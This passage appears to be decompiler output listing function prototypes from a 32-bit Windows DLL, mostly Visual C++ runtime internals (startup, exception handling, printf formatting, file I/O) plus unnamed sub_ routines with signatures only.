    "int __cdecl _Mtx_lock(_Mtx_t a1);",
    "int __cdecl _Mtx_unlock(_Mtx_t a1);",
    "int __cdecl mtx_do_lock(RTL_SRWLOCK *a1, int a2);",
    "__m128i *__stdcall sub_10015170(__m128i *a1, __m128i *a2, unsigned __int8 a3);",
    "__m128i *__stdcall sub_10015280(__m128i *a1, __m128i *a2, __int16 a3);",
    "__m128i *__stdcall sub_100153A0(__m128i *a1, __m128i *a2, unsigned __int8 a3);",
    "__m128i *__stdcall sub_100153B0(__m128i *a1, __m128i *a2, __int16 a3);",
    "const char *__cdecl std::_Syserror_map(int a1);",
    "// Microsoft VisualC 14/net runtime",
    "int __cdecl unknown_libname_5(int a1);",
    "__int64 __cdecl _Xtime_get_ticks();",
    "int __cdecl initialize_pointers();",
    "void __cdecl `anonymous namespace'::_UCalendar_deleter::operator()(LPFILETIME lpSystemTimeAsFileTime);",
    "void __fastcall __security_check_cookie(uintptr_t StackCookie);",
    "void __cdecl sub_100154EB(void *Block);",
    "_DWORD *__thiscall sub_100154F9(_DWORD *Block, char a2);",
    "void *__cdecl operator new(size_t Size);",
    "struct _IMAGE_SECTION_HEADER *__cdecl find_pe_section(unsigned __int8 *const a1, unsigned int a2);",
    "char __scrt_acquire_startup_lock();",
    "char __scrt_dllmain_after_initialize_c();",
    "bool __scrt_dllmain_before_initialize_c();",
    "char __scrt_dllmain_crt_thread_attach();",
    "char sub_1001561A();",
    "int __cdecl __scrt_dllmain_exception_filter(",
    "        int a1,",
    "        int a2,",
    "        int a3,",
    "        void (__thiscall *a4)(_DWORD, int, _DWORD, int),",
    "        unsigned int ExceptionNum,",
    "        struct _EXCEPTION_POINTERS *ExceptionPtr);",
    "void __scrt_dllmain_uninitialize_c();",
    "__vcrt_bool sub_1001567E();",
    "char __cdecl __scrt_initialize_crt(int a1);",
    "char __cdecl __scrt_initialize_onexit_tables(unsigned int a1);",
    "bool __cdecl __scrt_is_nonwritable_in_current_image(int a1);",
    "__int32 __cdecl __scrt_release_startup_lock(char a1);",
    "char __cdecl __scrt_uninitialize_crt(__vcrt_bool Terminating, char a2);",
    "_onexit_t __cdecl _onexit(_onexit_t Func);",
    "int __cdecl atexit(void (__cdecl *Func)());",
    "BOOL __cdecl __raise_securityfailure(struct _EXCEPTION_POINTERS *ExceptionInfo);",
    "void __cdecl  __report_gsfailure();",
    "void  sub_10015989();",
    "void __usercall  __report_securityfailure(int a1@<ebx>, int a2@<edi>, int a3@<esi>, unsigned int a4);",
    "// Microsoft VisualC 14/net runtime",
    "void *__cdecl unknown_libname_6(size_t a1);",
    "// attributes: thunk",
    "void __cdecl j_j_j___free_base(void *Block);",
    "int __stdcall dllmain_crt_dispatch(HINSTANCE a1, unsigned int a2, void *const a3);",
    "int __cdecl dllmain_crt_process_attach(HINSTANCE a1, void *const a2);",
    "BOOL __cdecl dllmain_crt_process_detach(__vcrt_bool Terminating);",
    "int __cdecl dllmain_dispatch(HINSTANCE hinstDLL, DWORD fdwReason, void *const lpvReserved);",
    "int __stdcall dllmain_raw(HINSTANCE a1, unsigned int a2, void *const a3);",
    "BOOL __stdcall DllEntryPoint(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved);",
    "// positive sp value has been detected, the output may be wrong!",
    "void _EH_epilog3();",
    "void _EH_epilog3_GS();",
    "_DWORD *__usercall _EH_prolog3@<eax>(int a1@<eax>);",
    "_DWORD *__usercall _EH_prolog3_GS@<eax>(int a1@<eax>);",
    "_DWORD *__usercall _EH_prolog3_catch@<eax>(int a1@<eax>);",
    "void nullsub_1();",
    "int sub_10015E9C();",
    "unsigned int __stdcall _aulldiv(unsigned __int64 a1, __int64 a2);",
    "unsigned __int64 __stdcall _aullrem(unsigned __int64 a1, __int64 a2);",
    "// attributes: thunk",
    "void __cdecl j_j___free_base(void *Block);",
    "void  sub_100162BA();",
    "int sub_100162D7();",
    "BOOL __scrt_is_ucrt_dll_in_use();",
    "LONG __usercall __scrt_fastfail@<eax>(int a1@<ebx>, int a2@<edi>, int a3@<esi>, unsigned int a4);",
    "void sub_100163FC();",
    "_DWORD *__cdecl _SEH_prolog4(int a1, int a2);",
    "unsigned int __get_entropy();",
    "void __cdecl __security_init_cookie();",
    "void sub_100164ED();",
    "int sub_100164F9();",
    "void *sub_10016505();",
    "_DWORD *__scrt_initialize_default_local_stdio_options();",
    "void *sub_10016528();",
    "void sub_1001652E();",
    "void sub_1001655A();",
    "void __stdcall  sub_10016590(int a1);",
    "_DWORD *__thiscall sub_100165B0(_DWORD *this, int a2);",
    "_DWORD *__thiscall sub_100165F0(_DWORD *this, int a2, int a3, char a4);",
    "HLOCAL __thiscall sub_10016640(void *this);",
    "void *__thiscall sub_100166B0(void *Block, char a2);",
    "void __cdecl  sub_10016740(int a1, int a2);",
    "_DWORD *__cdecl __FrameHandler3::GetRangeOfTrysToCheck(_DWORD *a1, int a2, int a3, int a4, int a5, int a6);",
    "void *__cdecl _CallCatchBlock2(",
    "        struct EHRegistrationNode *a1,",
    "        const struct _s_FuncInfo *a2,",
    "        void *a3,",
    "        int a4,",
    "        unsigned int a5);",
    "int __cdecl _CallSETranslator(",
    "        struct EHExceptionRecord *a1,",
    "        struct EHRegistrationNode *a2,",
    "        void *a3,",
    "        void *a4,",
    "        const struct _s_FuncInfo *a5,",
    "        int a6,",
    "        struct EHRegistrationNode *a7);",
    "void __stdcall _JumpToContinuation(",
    "        void (__stdcall *a1)(void *, struct EHRegistrationNode *),",
    "        struct EHRegistrationNode *a2);",
    "int __userpurge sub_10016951@<eax>(",
    "        struct _EXCEPTION_REGISTRATION_RECORD **a1@<ebx>,",
    "        PVOID TargetFrame,",
    "        PEXCEPTION_RECORD ExceptionRecord);",
    "int __cdecl _CatchGuardHandler(int a1, _DWORD *a2, int a3);",
    "_DWORD *__cdecl _CreateFrameInfo(_DWORD *a1, int a2);",
    "int __cdecl _FindAndUnlinkFrame(int a1);",
    "int __usercall sub_10016A42@<eax>(",
    "        struct _EXCEPTION_REGISTRATION_RECORD **a1@<ebx>,",
    "        PEXCEPTION_RECORD ExceptionRecord,",
    "        _DWORD *TargetFrame,",
    "        int a4);",
    "int __usercall __CxxFrameHandler3@<eax>(int a1@<eax>, int a2, int a3, int a4, int a5);",
    "void __cdecl __DestructExceptionObject(int a1);",
    "void __stdcall _CallMemberFunction0(void *const a1, void (__thiscall *a2)(void *const));",
    "unsigned int __cdecl _FilterSetCurrentException(struct _EXCEPTION_POINTERS *a1, char a2);",
    "int __cdecl _IsExceptionObjectToBeDestroyed(int a1);",
    "int __cdecl __AdjustPointer(int a1, _DWORD *a2);",
    "int __cdecl __FrameUnwindFilter(int a1);",
    "void __cdecl __std_exception_copy(int a1, int a2);",
    "void __cdecl __std_exception_destroy(int a1);",
    "int __cdecl ValidateLocalCookies(int a1);",
    "int __cdecl _except_handler4(PEXCEPTION_RECORD ExceptionRecord, char *TargetFrame, int a3);",
    "wchar_t *__cdecl wcsstr(const wchar_t *Str, const wchar_t *SubStr);",
    "void __stdcall  _CxxThrowException(void *pExceptionObject, _ThrowInfo *pThrowInfo);",
    "void *__cdecl memmove(void *a1, const void *Src, size_t Size);",
    "__vcrt_bool __cdecl __vcrt_initialize();",
    "__vcrt_bool __cdecl __vcrt_thread_attach();",
    "__vcrt_bool __cdecl __vcrt_thread_detach();",
    "__vcrt_bool __cdecl __vcrt_uninitialize(__vcrt_bool Terminating);",
    "__vcrt_bool __cdecl __vcrt_uninitialize_critical();",
    "void *__cdecl memset(void *a1, int Val, size_t Size);",
    "int __cdecl __std_type_info_compare(int a1, int a2);",
    "PSLIST_ENTRY __cdecl __std_type_info_destroy_list(PSLIST_HEADER ListHead);",
    "void __stdcall __vcrt_freefls(void *Block);",
    "void __vcrt_freeptd_for_this_thread();",
    "int __vcrt_getptd();",
    "int __vcrt_getptd_noexit();",
    "char __vcrt_initialize_ptd();",
    "char __vcrt_uninitialize_ptd();",
    "int __cdecl BuildCatchObjectHelperInternal<__FrameHandler3>(int a1, int *a2, int *a3, int a4);",
    "void __cdecl BuildCatchObjectInternal<__FrameHandler3>(int a1, int *a2, int *a3, int a4);",
    "void __cdecl CatchIt<__FrameHandler3>(",
    "        PEXCEPTION_RECORD ExceptionRecord,",
    "        struct EHRegistrationNode *a2,",
    "        int a3,",
    "        void *a4,",
    "        struct _s_FuncInfo *a5,",
    "        int a6,",
    "        int a7,",
    "        int *a8,",
    "        int a9,",
    "        struct EHRegistrationNode *TargetFrame);",
    "int __cdecl FindHandler<__FrameHandler3>(",
    "        struct EHExceptionRecord *ExceptionRecord,",
    "        struct EHRegistrationNode *a2,",
    "        void *a3,",
    "        void *a4,",
    "        struct _s_FuncInfo *a5,",
    "        char a6,",
    "        int a7,",
    "        struct EHRegistrationNode *TargetFrame);",
    "void __cdecl FindHandlerForForeignException<__FrameHandler3>(",
    "        PEXCEPTION_RECORD ExceptionRecord,",
    "        struct EHRegistrationNode *a2,",
    "        void *a3,",
    "        void *a4,",
    "        struct _s_FuncInfo *a5,",
    "        int a6,",
    "        int a7,",
    "        struct EHRegistrationNode *TargetFrame);",
    "int __cdecl TypeMatchHelper<__FrameHandler3>(int a1, int a2, _BYTE *a3);",
    "int __cdecl __InternalCxxFrameHandler<__FrameHandler3>(",
    "        struct EHExceptionRecord *ExceptionRecord,",
    "        struct EHRegistrationNode *a2,",
    "        void *a3,",
    "        void *a4,",
    "        struct _s_FuncInfo *a5,",
    "        int a6,",
    "        struct EHRegistrationNode *TargetFrame,",
    "        unsigned __int8 a8);",
    "int __cdecl __InternalCxxFrameHandlerWrapper<__FrameHandler3>(",
    "        struct EHExceptionRecord *ExceptionRecord,",
    "        struct EHRegistrationNode *a2,",
    "        void *a3,",
    "        void *a4,",
    "        struct _s_FuncInfo *a5,",
    "        int a6,",
    "        struct EHRegistrationNode *TargetFrame,",
    "        unsigned __int8 a8);",
    "char *__thiscall sub_10018359(char *this, int a2);",
    "_DWORD *__thiscall sub_10018374(_DWORD *this);",
    "bool __thiscall type_info::operator==(void *this, int a2);",
    "void *__cdecl sub_100183AB(",
    "        _DWORD *a1,",
    "        struct EHRegistrationNode *a2,",
    "        int a3,",
    "        struct _s_FuncInfo *a4,",
    "        void *a5,",
    "        int a6,",
    "        unsigned int a7);",
    "void __cdecl  CallUnexpected();",
    "int __cdecl ExFilterRethrow(struct _EXCEPTION_POINTERS *a1);",
    "void __cdecl __FrameHandler3::FrameUnwindToEmptyState(",
    "        struct EHRegistrationNode *a1,",
    "        void *a2,",
    "        const struct _s_FuncInfo *a3);",
    "void __cdecl __FrameHandler3::FrameUnwindToState(",
    "        struct EHRegistrationNode *a1,",
    "        void *a2,",
    "        const struct _s_FuncInfo *a3,",
    "        int a4);",
    "char __cdecl IsInExceptionSpec(struct EHExceptionRecord *a1, const struct _s_ESTypeList *a2);",
    "void __stdcall _CallMemberFunction1(void *const a1, void (__thiscall *a2)(void *const, void *const), void *const a3);",
    "void __stdcall _CallMemberFunction2(",
    "        void *const a1,",
    "        void (__thiscall *a2)(void *const, void *const, int),",
    "        void *const a3,",
    "        int a4);",
    "const struct _s_ESTypeList *__cdecl __FrameHandler3::getESTypes(const struct _s_FuncInfo *a1);",
    "int __stdcall _CallSettingFrame(int a1, int a2, int a3);",
    "int (*__cdecl __except_validate_context_record(int a1))();",
    "int __cdecl _local_unwind4(_DWORD *a1, int a2, unsigned int a3);",
    "int __cdecl _unwind_handler4(int a1, int a2, int a3, _DWORD *a4);",
    "int __thiscall _EH4_CallFilterFunc(int (*this)(void));",
    "int __thiscall _EH4_TransferToHandler(int (__fastcall *this)(_DWORD, _DWORD));",
    "void __fastcall _EH4_GlobalUnwind2(PVOID TargetFrame, PEXCEPTION_RECORD ExceptionRecord);",
    "int __fastcall _EH4_LocalUnwind(int a1, unsigned int a2, int a3, _DWORD *a4);",
    "char __vcrt_initialize_locks();",
    "char __vcrt_uninitialize_locks();",
    "FARPROC __cdecl try_get_function(int a1, const CHAR *lpProcName, int *a3, int *a4);",
    "HINSTANCE __cdecl try_load_library_from_system_directory(LPCWSTR lpLibFileName);",
    "DWORD __cdecl __vcrt_FlsAlloc(int a1);",
    "int __cdecl __vcrt_FlsFree(DWORD dwTlsIndex);",
    "LPVOID __cdecl __vcrt_FlsGetValue(DWORD dwTlsIndex);",
    "int __cdecl __vcrt_FlsSetValue(DWORD dwTlsIndex, LPVOID lpTlsValue);",
    "int __cdecl __vcrt_InitializeCriticalSectionEx(LPCRITICAL_SECTION lpCriticalSection, DWORD dwSpinCount, int a3);",
    "void  unexpected();",
    "__ehstate_t __cdecl __FrameHandler3::GetCurrentState(",
    "        struct EHRegistrationNode *a1,",
    "        void *a2,",
    "        const struct _s_FuncInfo *a3);",
    "void __cdecl __FrameHandler3::SetState(struct EHRegistrationNode *a1, const struct _s_FuncInfo *a2, __ehstate_t a3);",
    "void __stdcall sub_10018C90(int a1);",
    "int __userpurge _NLG_Notify@<eax>(int result@<eax>, int a2@<ebp>, int a3);",
    "int __usercall sub_10018CC0@<eax>(int (*a1)(void)@<eax>);",
    "__crt_cached_ptd_host *__thiscall __crt_cached_ptd_host::__crt_cached_ptd_host(",
    "        __crt_cached_ptd_host *this,",
    "        struct __crt_locale_pointers *const a2);",
    "void __thiscall __crt_cached_ptd_host::~__crt_cached_ptd_host(__crt_cached_ptd_host *this);",
    "unsigned int __thiscall __crt_cached_ptd_host::check_synchronize_global_state_index(__crt_cached_ptd_host *this);",
    "struct __acrt_ptd *__thiscall __crt_cached_ptd_host::force_synchronize_per_thread_data(__crt_cached_ptd_host *this);",
    "// Microsoft VisualC universal runtime",
    "int __thiscall unknown_libname_7(__crt_cached_ptd_host *this);",
    "void __usercall __acrt_call_reportfault(int a1@<ebx>, int a2@<edi>, int a3@<esi>, int a4, int a5, int a6);",
    "int __cdecl sub_10018F0C(int a1);",
    "void __cdecl _invalid_parameter(",
    "        wchar_t *Expression,",
    "        wchar_t *FunctionName,",
    "        wchar_t *FileName,",
    "        unsigned int LineNo,",
    "        uintptr_t Reserved);",
    "int __cdecl _invalid_parameter_internal(",
    "        wchar_t *Expression,",
    "        wchar_t *FunctionName,",
    "        wchar_t *FileName,",
    "        unsigned int LineNo,",
    "        uintptr_t Reserved,",
    "        struct __acrt_ptd **a6);",
    "void __cdecl _invalid_parameter_noinfo();",
    "void __cdecl  _invalid_parameter_noinfo_noreturn();",
    "void __cdecl  _invoke_watson(",
    "        const wchar_t *Expression,",
    "        const wchar_t *FunctionName,",
    "        const wchar_t *FileName,",
    "        unsigned int LineNo,",
    "        uintptr_t Reserved);",
    "int __cdecl __acrt_locale_get_ctype_array_value(",
    "        const unsigned __int16 *const Locale_pctype_array,",
    "        const int Char_value,",
    "        const int Mask);",
    "int __cdecl common_vsprintf<__crt_stdio_output::standard_base,char>(",
    "        int a1,",
    "        int a2,",
    "        _DWORD *a3,",
    "        unsigned int a4,",
    "        int a5,",
    "        __crt_cached_ptd_host *a6,",
    "        int a7);",
    "int __cdecl common_vsprintf<__crt_stdio_output::standard_base,wchar_t>(",
    "        int a1,",
    "        int a2,",
    "        _DWORD *a3,",
    "        unsigned int a4,",
    "        int a5,",
    "        __crt_cached_ptd_host *a6,",
    "        int a7);",
    "int __thiscall __crt_stdio_output::formatting_buffer::count<char>(_DWORD *this);",
    "int __thiscall __crt_stdio_output::formatting_buffer::count<wchar_t>(_DWORD *this);",
    "char __thiscall sub_1001937A(_DWORD *this, unsigned int a2, int a3);",
    "char __thiscall sub_100193FA(_DWORD *this, unsigned int a2, int a3);",
    "bool __cdecl __crt_strtox::is_overflow_condition<unsigned long>(char a1, unsigned int a2);",
    "bool __cdecl __crt_stdio_output::is_wide_character_specifier<char>(int a1, int a2, char a3, int a4);",
    "char __cdecl __crt_stdio_output::is_wide_character_specifier<wchar_t>(char a1, int a2, __int16 a3, int a4);",
    "// Microsoft VisualC universal runtime",
    "_DWORD *__cdecl unknown_libname_8(_DWORD *a1, int a2, _DWORD *a3);",
    "int __cdecl sub_10019549(__crt_cached_ptd_host *a1, char *a2, char **a3, int a4, char a5);",
    "int __cdecl sub_1001975C(__crt_cached_ptd_host *a1, _WORD *a2, _DWORD *a3, int a4, char a5);",
    "char *__thiscall __crt_stdio_output::formatting_buffer::scratch_data<char>(_DWORD *this);",
    "char __thiscall sub_10019D5E(int this, int a2);",
    "char __thiscall sub_10019EEB(int this, int a2);",
    "char __thiscall sub_1001A07D(int this, char a2);",
    "char __thiscall sub_1001A20A(int this, char a2);",
    "char __thiscall sub_1001A39C(int this, char a2);",
    "char __thiscall sub_1001A529(int this, char a2);",
    "_BYTE *__thiscall sub_1001A6BB(_DWORD *this, unsigned int a2, int a3);",
    "_WORD *__thiscall sub_1001A71D(_DWORD *this, unsigned int a2, int a3);",
    "_BYTE *__thiscall sub_1001A78E(_DWORD *this, unsigned int a2, char a3);",
    "_WORD *__thiscall sub_1001A80D(_DWORD *this, unsigned int a2, char a3);",
    "_BYTE *__thiscall sub_1001A8A2(_DWORD *this, unsigned int a2, char a3);",
    "_WORD *__thiscall sub_1001A91E(_DWORD *this, unsigned int a2, char a3);",
    "_BYTE *__thiscall sub_1001A9A9(_DWORD *this, unsigned int a2, unsigned int a3, int a4);",
    "_WORD *__thiscall sub_1001AA1D(_DWORD *this, unsigned int a2, unsigned int a3, int a4);",
    "_BYTE *__thiscall sub_1001AA9D(_DWORD *this, unsigned __int64 a2, char a3);",
    "_WORD *__thiscall sub_1001AB2F(_DWORD *this, unsigned int a2, unsigned int a3, char a4);",
    "_BYTE *__thiscall sub_1001ABD4(_DWORD *this, unsigned int a2, unsigned int a3, char a4);",
    "_WORD *__thiscall sub_1001AC5A(_DWORD *this, unsigned int a2, unsigned int a3, char a4);",
    "// Microsoft VisualC universal runtime",
    "_DWORD *__thiscall unknown_libname_9(_DWORD *this, _DWORD *a2, int a3, int a4, int a5, int a6, int a7);",
    "// Microsoft VisualC universal runtime",
    "_DWORD *__thiscall unknown_libname_10(_DWORD *this, _DWORD *a2, int a3, int a4, int a5, int a6, int a7);",
    "void __thiscall __crt_stdio_output::formatting_buffer::~formatting_buffer(void **this);",
    "// Microsoft VisualC universal runtime",
    "void **__thiscall unknown_libname_11(void **this, void **a2);",
    "char __cdecl sub_1001ADFD(char *a1, int a2);",
    "// Microsoft VisualC universal runtime",
    "char __stdcall unknown_libname_12(char a1, char a2);",
    "// Microsoft VisualC universal runtime",
    "char __stdcall unknown_libname_13(__int16 a1, char a2);",
    "unsigned __int8 __cdecl sub_1001AEDC(unsigned __int8 *a1, int *a2);",
    "// Microsoft VisualC universal runtime",
    "char __thiscall unknown_libname_14(_DWORD *this, int *a2);",
    "// Microsoft VisualC universal runtime",
    "char __thiscall unknown_libname_15(_DWORD *this, int *a2);",
    "int __thiscall __crt_stdio_output::output_processor<char,__crt_stdio_output::string_output_adapter<char>,__crt_stdio_output::standard_base<char,__crt_stdio_output::string_output_adapter<char>>>::process(",
    "        int this);",
    "int __thiscall __crt_stdio_output::output_processor<wchar_t,__crt_stdio_output::string_output_adapter<wchar_t>,__crt_stdio_output::standard_base<wchar_t,__crt_stdio_output::string_output_adapter<wchar_t>>>::process(",
    "        int this);",
    "char __cdecl sub_1001B540(int a1, int a2);",
    "char __thiscall sub_1001B699(unsigned __int16 *this);",
    "char __thiscall sub_1001B823(int this);",
    "char __thiscall sub_1001BC62(int this);",
    "int __cdecl sub_1001C178(int a1);",
    "char __thiscall sub_1001C1CC(void *this);",
    "char __thiscall sub_1001C23F(int *this);",
    "char __thiscall sub_1001C2B3(int this);",
    "char __thiscall sub_1001C46A(int this);",
    "char __thiscall sub_1001C637(int this, int a2);",
    "// Microsoft VisualC universal runtime",
    "char __thiscall unknown_libname_16(char *this, int a2);",
    "char __thiscall sub_1001C768(int this);",
    "char __thiscall sub_1001C7ED(_DWORD *this);",
    "char __thiscall sub_1001C80A(_DWORD *this);",
    "char __thiscall sub_1001C827(_DWORD *this);",
    "char __thiscall sub_1001C83D(_DWORD *this);",
    "char __thiscall sub_1001C853(int this);",
    "char __thiscall sub_1001C8C6(void *this);",
    "int __thiscall sub_1001C93B(int this, int a2, int a3);",
    "void __thiscall __crt_strtox::c_string_character_source<char>::unget(_DWORD *this, char a2);",
    "void __thiscall __crt_strtox::c_string_character_source<wchar_t>::unget(_DWORD *this, __int16 a2);",
    "void __thiscall __crt_cached_ptd_host::update_locale_slow(__crt_cached_ptd_host *this);",
    "// Microsoft VisualC universal runtime",
    "char __thiscall unknown_libname_17(_DWORD *this);",
    "// Microsoft VisualC universal runtime",
    "char __thiscall unknown_libname_18(_DWORD *this, __crt_cached_ptd_host *a2);",
    "void __thiscall sub_1001CB07(int *this, void *Src, unsigned int a3, _DWORD *a4, int a5);",
    "_DWORD *__thiscall sub_1001CB76(_DWORD *this, void *Src, unsigned int a3, _DWORD *a4, int a5);",
    "int __cdecl __stdio_common_vsprintf(",
    "        unsigned __int64 Options,",
    "        char *Buffer,",
    "        size_t BufferCount,",
    "        const char *Format,",
    "        _locale_t Locale,",
    "        va_list ArgList);",
    "int __cdecl __stdio_common_vswprintf(",
    "        unsigned __int64 Options,",
    "        wchar_t *Buffer,",
    "        size_t BufferCount,",
    "        const wchar_t *Format,",
    "        _locale_t Locale,",
    "        va_list ArgList);",
    "// attributes: thunk",
    "void __cdecl j___free_base(void *Block);",
    "int __cdecl sub_1001CC90(int a1);",
    "int __cdecl __acrt_convert_wcs_mbs_cp<char,wchar_t,_lambda_62f6974d9771e494a5ea317cc32e971c_,__crt_win32_buffer_internal_dynamic_resizing>(",
    "        LPCCH lpMultiByteStr,",
    "        int a2,",
    "        int a3,",
    "        UINT CodePage);",
    "int __cdecl sub_1001CD4D(LPCCH lpMultiByteStr, int a2, UINT CodePage);",
    "_LocaleUpdate *__thiscall _LocaleUpdate::_LocaleUpdate(_LocaleUpdate *this, struct __crt_locale_pointers *const a2);",
    "int __cdecl __acrt_get_utf8_acp_compatibility_codepage();",
    "// Microsoft VisualC universal runtime",
    "void __thiscall unknown_libname_19(int this);",
    "int __thiscall sub_1001CE45(int this, int a2);",
    "int __cdecl sub_1001CE84(_DWORD *a1, int a2);",
    "int __cdecl _mkdir(const char *Path);",
    "int __cdecl common_fsopen<char>(_BYTE *a1, _BYTE *a2);",
    "FILE *__cdecl fopen(const char *FileName, const char *Mode);",
    "int __cdecl sub_1001CFDD(__int64 a1, __int64 a2, int *a3);",
    "int __cdecl common_fseek(FILE *Stream, int a2, int a3, unsigned int a4, __crt_cached_ptd_host *a5);",
    "char __cdecl common_fseek_binary_mode_read_only_fast_track_nolock(int *a1, __int64 a2, int a3);",
    "int __cdecl common_fseek_nolock(FILE *Stream, __int64 liDistanceToMove, DWORD dwMoveMethod, int a4);",
    "int __cdecl fseek(FILE *Stream, int Offset, int Origin);",
    "int __cdecl common_ftell<long>(FILE *Stream, __crt_cached_ptd_host *a2);",
    "int __cdecl common_ftell_nolock<long>(FILE *Stream, __crt_cached_ptd_host *a2);",
    "unsigned int __cdecl common_ftell_nolock<__int64>(FILE *Stream, __crt_cached_ptd_host *a2);",
    "int __cdecl common_ftell_read_mode_nolock(",
    "        FILE *Stream,",
    "        LARGE_INTEGER liDistanceToMove,",
    "        __int64 a3,",
    "        __crt_cached_ptd_host *a4);",
    "DWORD __cdecl sub_1001D726(FILE *Stream, LARGE_INTEGER liDistanceToMove, __crt_cached_ptd_host *a3);",
    "int __cdecl sub_1001D8EC(_WORD *a1, _WORD *a2, char a3);",
    "unsigned int __cdecl _ftelli64_nolock_internal(FILE *Stream, __crt_cached_ptd_host *a2);",
    "int __cdecl ftell(FILE *Stream);",
    "unsigned int __cdecl sub_1001D990(void *a1, size_t Size, unsigned int a3, unsigned int a4, FILE *Stream);",
    "size_t __cdecl fread(void *Buffer, size_t ElementSize, size_t ElementCount, FILE *Stream);",
    "size_t __cdecl fread_s(void *Buffer, size_t BufferSize, size_t ElementSize, size_t ElementCount, FILE *Stream);",
    "errno_t __cdecl memcpy_s(",
    "        void *const Destination,",
    "        const rsize_t DestinationSize,",
    "        const void *const Source,",
    "        const rsize_t SourceSize);",
    "int __cdecl _fclose_internal(FILE *Stream, struct __crt_cached_ptd_host *a2);",
    "int __cdecl _fclose_nolock_internal(FILE *Stream, struct __crt_cached_ptd_host *a2);",
    "int __cdecl fclose(FILE *Stream);",
    "int __cdecl sub_1001DDF4(char *String2);",
    "const char *__cdecl common_getenv_nolock<char>(char *String2);",
    "int __cdecl sub_1001DEE0(char *String2);",
    "_DWORD *__cdecl sub_1001DEEB(unsigned int a1, int a2, unsigned int a3);",
    "int __cdecl sub_1001DF6A(unsigned int a1);",
    "int *__cdecl __acrt_errno_map_os_error(unsigned int a1);",
    "int __cdecl __acrt_errno_map_os_error_ptd(unsigned int a1, int a2);",
    "void *sub_1001E010();",
    "void *sub_1001E025();",
    "int __cdecl sub_1001E03A(__crt_cached_ptd_host *a1, wint_t *a2, wint_t **a3, int a4, char a5);",
    "int __cdecl sub_1001E65D(int a1, _DWORD *a2, int a3);",
    "int __cdecl __acrt_convert_wcs_mbs_cp<wchar_t,char,_lambda_0fec1a7b3f42a53036604e18c2d5e07e_,__crt_win32_buffer_no_resizing>(",
    "        LPCWCH lpWideCharStr,",
    "        int a2,",
    "        int a3,",
    "        unsigned int a4);",
    "// Microsoft VisualC universal runtime",
    "int __stdcall unknown_libname_20(unsigned int a1, LPCWCH lpWideCharStr, LPSTR lpMultiByteStr, int cbMultiByte);",
    "// Microsoft VisualC universal runtime",
    "int __thiscall unknown_libname_21(int this, int a2);",
    "int __thiscall __crt_win32_buffer<char,__crt_win32_buffer_no_resizing>::set_to_nullptr(int this);",
    "void __cdecl  abort();",
    "int __acrt_initialize_stdio();",
    "void __acrt_uninitialize_stdio();",
    "void __cdecl _lock_file(FILE *Stream);",
    "void __cdecl _unlock_file(FILE *Stream);",
    "int __cdecl sub_1001E950(int a1, int a2);",
    "int __cdecl _callnewh(size_t Size);",
    "int __cdecl sub_1001E9A0(int a1);",
    "_PNH __cdecl _query_new_handler();",
    "_PNH __cdecl _set_new_handler(_PNH NewHandler);",
    "// Microsoft VisualC universal runtime",
    "int __cdecl unknown_libname_22(int a1);",
    "// Microsoft VisualC universal runtime",
    "uintptr_t __cdecl unknown_libname_23(int a1);",
    "int __cdecl _seh_filter_dll(unsigned int ExceptionNum, struct _EXCEPTION_POINTERS *ExceptionPtr);",
    "int __cdecl _seh_filter_exe(unsigned int ExceptionNum, struct _EXCEPTION_POINTERS *ExceptionPtr);",
    "int __stdcall __crt_seh_guarded_call<void>::operator()<_lambda_4fdada1b837b2abbf20876fac97688ad_,_lambda_b57350f2640456a0859d250846f69caf_ &,_lambda_eed5e4f92b5b7d55fa22c48c484aaa54_>(",
    "        _DWORD *a1,",
    "        int a2,",
    "        _DWORD *a3);",
    "void __thiscall _lambda_6e4b09c48022b2350581041d5f6b0c4c_::operator()(int **this);",
    "void __cdecl common_exit(UINT uExitCode, enum _crt_exit_cleanup_mode a2, enum _crt_exit_return_mode a3);",
    "void __cdecl  sub_1001EE30(UINT uExitCode, char a2);",
    "bool __scrt_is_managed_app();",
    "void __cdecl try_cor_exit_process(unsigned int a1);",
    "int __cdecl sub_1001EF22(int a1);",
    "void __cdecl _cexit();",
    "void __cdecl  _exit(int Code);",
    "int sub_1001EF56();",
    "int __cdecl common_configure_argv<char>(int a1);",
    "_DWORD *__cdecl sub_1001F09A(char *a1, char **a2, char *a3, _DWORD *a4, _DWORD *a5);",
    "int __cdecl __acrt_allocate_buffer_for_argv(unsigned int a1, unsigned int a2, unsigned int a3);",
    "errno_t __cdecl _configure_narrow_argv(_crt_argv_mode mode);",
    "int sub_1001F266();",
    "int common_initialize_environment_nolock<char>();",
    "void *__cdecl sub_1001F2EC(char *Source);",
    "// Microsoft VisualC universal runtime",
    "void __cdecl unknown_libname_24(void **Block);",
    "int initialize_environment_by_cloning_nolock<char>();",
    "void __cdecl sub_1001F483(void ***a1);",
    "void __cdecl sub_1001F49E(void ***a1);",
    "// attributes: thunk",
    "int sub_1001F4B9(void);",
    "void __dcrt_uninitialize_environments_nolock();",
    "// attributes: thunk",
    "int common_initialize_environment_nolock<char>(void);",
    "int __stdcall sub_1001F514(_DWORD *a1, int a2, _DWORD *a3);",
    "int __stdcall sub_1001F56F(_DWORD *a1, int a2, _DWORD *a3);",
    "int __thiscall sub_1001F5CA(int **this);",
    "// Microsoft VisualC universal runtime",
    "int __thiscall unknown_libname_25(_DWORD **this);",
    "int __cdecl sub_1001F7B7(_onexit_t Function);",
    "int __cdecl _execute_onexit_table(_onexit_table_t *Table);",
    "int __cdecl _initialize_onexit_table(_onexit_table_t *Table);",
    "int __cdecl _register_onexit_function(_onexit_table_t *Table, _onexit_t Function);",
    "char sub_1001F867();",
    "char initialize_c();",
    "char sub_1001F88E();",
    "char sub_1001F891();",
    "char __usercall initialize_pointers@<al>(int a1@<esi>);",
    "__vcrt_bool sub_1001F8C7();",
    "char uninitialize_allocated_memory();",
    "char uninitialize_allocated_io_buffers();",
    "// Microsoft VisualC universal runtime",
    "void __stdcall unknown_libname_26(void **a1);",
    "__crt_bool __cdecl __acrt_initialize();",
    "bool sub_1001F977();",
    "char sub_1001F982();",
    "__crt_bool __cdecl __acrt_uninitialize(__crt_bool Terminating);",
    "__crt_bool __cdecl __acrt_uninitialize_critical(__crt_bool Terminating);",
    "void __cdecl _initterm(_PVFV *First, _PVFV *Last);",
    "int __cdecl _initterm_e(_PIFV *First, _PIFV *Last);",
    "void  terminate();",
    "// attributes: thunk",
    "void j_nullsub_1();",
    "errno_t __cdecl strcpy_s(char *Destination, rsize_t SizeInBytes, const char *Source);",
    "int __cdecl strncmp(const char *Str1, const char *Str2, size_t MaxCount);",
